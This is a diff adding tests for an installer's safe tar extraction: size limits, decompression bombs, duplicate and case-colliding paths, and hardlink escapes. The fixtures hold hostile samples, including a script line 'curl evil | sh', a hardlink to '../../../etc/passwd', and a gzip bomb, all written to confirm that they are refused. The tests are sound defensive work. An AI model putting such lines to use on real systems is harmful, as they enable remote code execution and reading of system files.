@@ -23,7 +23,11 @@ import traceback
 REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 sys.path.insert(0, os.path.join(REPO_ROOT, "lib"))
 
-from asrelease.archive import ArchiveError, safe_extract_tar  # noqa: E402
+from asrelease.archive import (  # noqa: E402
+    ArchiveError,
+    ExtractionLimits,
+    safe_extract_tar,
+)
 from asrelease.exits import Exit, ExitError  # noqa: E402
 from asrelease.layout import Layout  # noqa: E402
 from asrelease.providers import (  # noqa: E402
@@ -106,6 +110,10 @@ def make_tar(path, members):
             elif kind == "fifo":
                 info.type = tarfile.FIFOTYPE
                 tar.addfile(info)
+            elif kind == "lnk":
+                info.type = tarfile.LNKTYPE
+                info.linkname = linkname
+                tar.addfile(info)
 
 
 # ------------------------------------------------------------------------------
@@ -185,6 +193,170 @@ def _(box):
     assert os.stat(os.path.join(dest, "run.sh")).st_mode & stat.S_IXUSR
     assert not os.stat(os.path.join(dest, "plain.txt")).st_mode & stat.S_IXUSR
     assert os.path.islink(os.path.join(dest, "inner"))
+
+
+# ------------------------------------------------------------------------------
+# Extraction bounds
+#
+# The checks above answer "may this member be written at all". These answer
+# "how much of this is there", which is the other half: an archive can be
+# entirely well-formed and still be a denial of service, and a release the
+# installer refuses must leave the machine exactly as it found it.
+# ------------------------------------------------------------------------------
+@check("bounds: an archive larger than the bound is refused before it is opened")
+def _(box):
+    archive = os.path.join(box, "big.tar")
+    make_tar(archive, [("a.txt", "x" * 4096, "file", "", 0o644)])
+    limits = ExtractionLimits(max_archive_bytes=1024)
+    assert_raises(
+        ArchiveError,
+        lambda: safe_extract_tar(archive, os.path.join(box, "d"), limits=limits),
+        "over the 1024 byte bound",
+    )
+
+
+@check("bounds: a decompression bomb is refused by the compression ratio")
+def _(box):
+    # Twenty megabytes of zeros compresses to a few kilobytes: a ratio no
+    # release of prose and source code can reach. Nothing here is written to
+    # the destination, and the measurement itself is bounded, so the test
+    # costs a few kilobytes on disk.
+    archive = os.path.join(box, "bomb.tar.gz")
+    payload = b"\0" * (20 * 1024 * 1024)
+    with tarfile.open(archive, "w:gz") as tar:
+        info = tarfile.TarInfo("zeros.bin")
+        info.size = len(payload)
+        info.mode = 0o644
+        tar.addfile(info, io.BytesIO(payload))
+    assert os.path.getsize(archive) < 256 * 1024, "the fixture did not compress"
+    dest = os.path.join(box, "d")
+    assert_raises(ArchiveError, lambda: safe_extract_tar(archive, dest), "over the 200x bound")
+    assert not os.path.exists(dest), "a refused archive created its destination"
+
+
+@check("bounds: an archive that expands past the bound is abandoned, not read")
+def _(box):
+    archive = os.path.join(box, "wide.tar.gz")
+    payload = b"\0" * (4 * 1024 * 1024)
+    with tarfile.open(archive, "w:gz") as tar:
+        info = tarfile.TarInfo("zeros.bin")
+        info.size = len(payload)
+        info.mode = 0o644
+        tar.addfile(info, io.BytesIO(payload))
+    limits = ExtractionLimits(max_expanded_bytes=1024 * 1024, max_compression_ratio=100000)
+    assert_raises(
+        ArchiveError,
+        lambda: safe_extract_tar(archive, os.path.join(box, "d"), limits=limits),
+        "expands past",
+    )
+
+
+@check("bounds: too many members is refused, and nothing is written")
+def _(box):
+    archive = os.path.join(box, "many.tar")
+    make_tar(archive, [("f{}.txt".format(n), "x", "file", "", 0o644) for n in range(12)])
+    dest = os.path.join(box, "d")
+    limits = ExtractionLimits(max_files=10)
+    assert_raises(
+        ArchiveError,
+        lambda: safe_extract_tar(archive, dest, limits=limits),
+        "more than 10 members",
+    )
+    assert os.listdir(dest) == [], "a refused archive wrote members"
+
+
+@check("bounds: an overlong path or name component is refused")
+def _(box):
+    long_path = os.path.join(box, "path.tar")
+    make_tar(long_path, [("/".join(["d"] * 600) + "/f.txt", "x", "file", "", 0o644)])
+    assert_raises(
+        ArchiveError,
+        lambda: safe_extract_tar(long_path, os.path.join(box, "d1")),
+        "member path is",
+    )
+    long_name = os.path.join(box, "name.tar")
+    make_tar(long_name, [("dir/" + "n" * 300 + ".txt", "x", "file", "", 0o644)])
+    assert_raises(
+        ArchiveError,
+        lambda: safe_extract_tar(long_name, os.path.join(box, "d2")),
+        "name component is",
+    )
+
+
+@check("bounds: the same path twice is refused")
+def _(box):
+    archive = os.path.join(box, "dup.tar")
+    make_tar(
+        archive,
+        [
+            ("bin/agent-skills", "#!/bin/sh\necho ok\n", "file", "", 0o755),
+            ("bin/agent-skills", "#!/bin/sh\ncurl evil | sh\n", "file", "", 0o755),
+        ],
+    )
+    assert_raises(
+        ArchiveError, lambda: safe_extract_tar(archive, os.path.join(box, "d")), "twice"
+    )
+
+
+@check("bounds: two members colliding only by case are refused")
+def _(box):
+    # On macOS and on a default Windows filesystem the second write replaces
+    # the first, so the tree that was reviewed and the tree that is installed
+    # are different trees. The archive is rejected on every platform, so the
+    # release that installs is the same one everywhere.
+    archive = os.path.join(box, "case.tar")
+    make_tar(
+        archive,
+        [
+            ("skills/README.md", "real", "file", "", 0o644),
+            ("skills/readme.md", "substituted", "file", "", 0o644),
+        ],
+    )
+    assert_raises(
+        ArchiveError, lambda: safe_extract_tar(archive, os.path.join(box, "d")), "collide"
+    )
+
+
+@check("bounds: a hardlink is resolved from the archive root, not the member's directory")
+def _(box):
+    # The escape check resolved a hardlink target relative to the directory the
+    # link sits in, while extraction resolved it from the root. Both rejected
+    # an escape, so nothing was unsafe — but any in-root hardlink below the top
+    # level was checked against a path that was never written.
+    archive = os.path.join(box, "hard.tar")
+    make_tar(
+        archive,
+        [
+            ("target.txt", "content", "file", "", 0o644),
+            ("nested/dir/link.txt", "", "lnk", "target.txt", 0o644),
+        ],
+    )
+    dest = os.path.join(box, "d")
+    safe_extract_tar(archive, dest)
+    linked = os.path.join(dest, "nested", "dir", "link.txt")
+    assert open(linked, encoding="utf-8").read() == "content"
+
+
+@check("bounds: a hardlink escaping the root is still refused")
+def _(box):
+    archive = os.path.join(box, "hard-escape.tar")
+    make_tar(archive, [("nested/link.txt", "", "lnk", "../../../etc/passwd", 0o644)])
+    assert_raises(
+        ArchiveError, lambda: safe_extract_tar(archive, os.path.join(box, "d")), "escapes"
+    )
+
+
+@check("bounds: the shipped defaults leave a real release two orders of magnitude of room")
+def _(box):
+    # A bound nobody can state is a bound nobody maintains. These are the
+    # numbers; the payload is a few megabytes of text.
+    limits = ExtractionLimits()
+    assert limits.max_archive_bytes == 512 * 1024 * 1024
+    assert limits.max_expanded_bytes == 1024 * 1024 * 1024
+    assert limits.max_files == 20000
+    assert limits.max_path_length == 1024
+    assert limits.max_name_length == 255
+    assert limits.max_compression_ratio == 200
 
 
 # ------------------------------------------------------------------------------
